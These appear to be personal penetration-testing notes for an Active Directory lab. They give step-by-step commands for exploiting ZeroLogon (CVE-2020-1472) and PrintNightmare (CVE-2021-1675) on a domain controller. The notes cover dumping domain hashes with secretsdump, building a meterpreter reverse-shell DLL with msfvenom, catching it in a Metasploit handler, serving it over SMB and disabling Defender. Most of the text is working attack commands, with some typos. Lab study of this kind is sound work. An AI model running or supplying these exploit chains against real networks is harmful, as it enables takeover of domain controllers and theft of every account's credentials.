## Overview

AD vulnerabilty occur all the time, look for them :
- ZeroLogon
- PrintNightmare
- Sam the Admin
- EthernalBlue

## Abusing ZeroLogon

When running this attack if we do not restore the password the DC breaks

Goal is to set authentification to null on this machine in order to be able to log on it without password

From Kali machine : 
cd /opt
mkdir CVE-2020-1472
cd CVE-2020-1472
git clone https://github.com/dirkjanm/CVE-2020-1472 //only use tester
./zerologon_check.py HYDRA-DC 192.168.138.132

This attack is not to be run if no restore option is available
python3 cve-2020-1472.py HYDRA-DC 192.168.138.132

Then use secretsdump:
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132
Keep password empty and click enter

Then get administrator hash
secretscump.py adminsitrator@192.168.163.132 -hash HASH //look for plain_password_hex to restore DC

Restore DC:
python3 restorepassword.py MARVEL\HYDRA-PC@HYDRA-DC -target-ip 192.168.138.132 -hexpass PLAIN_PASSWORD_HEX

## PrintNightmare

It takes advantage of printers spooler using the ability of users to add printers as a privilege.
cube0x0/CVE-2021-1675 on Github

Same as before we test if the DC is vulnerable using rcpdum.py
rcpdump.py @192.168.138.132 |grep 'MS-RPRN|MS-PAR' //from Github repo

Install impacket using pip or cube0x0 install from Github

git clone repo or copy/paste exploit code
Then we execture exemple attack from README using a malicious dll hosting that dll using SMB server from impacket and create the dll
We generate the payload :
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT 5555 -f dll > shell.dll //IP of attacker machine

From another tab:
msfconsole
use multi/handler
options
set payload windows/x64/meterpreter/reverse_tcp
set lport 5555
set lhost 192.168.138.128
run

On another tab set a file share
smbserver.py  share 'pwd' -smb2support //entire directory is being shared
Everything is set up, we only need a user:pass //just a user, not necessary an admin
python3 CVE-2021-1675.py marvel.local/fcastle:Pasword1@192.168.138.132 '//192.168.138.128\share\shell.dll'

Can require to turn off Defender, the from msfconsole we got our meterpreter